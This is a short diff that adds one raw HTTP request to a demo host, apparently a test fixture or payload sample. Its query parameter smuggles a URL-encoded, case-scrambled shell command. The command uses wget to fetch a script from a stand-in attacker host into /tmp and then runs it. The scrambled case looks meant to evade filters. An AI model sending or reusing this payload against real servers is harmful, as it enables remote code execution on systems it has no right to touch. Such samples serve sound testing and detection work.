@@ -1,0 +1,4 @@
+GET /a?data=;%20wGeT%20hTtP://eViL.tLd/S.sH%20-o%20/TmP/s.Sh;%20Sh%20/TmP/s.Sh HTTP/1.1
+Host: demo.example.com
+Connection: close
+
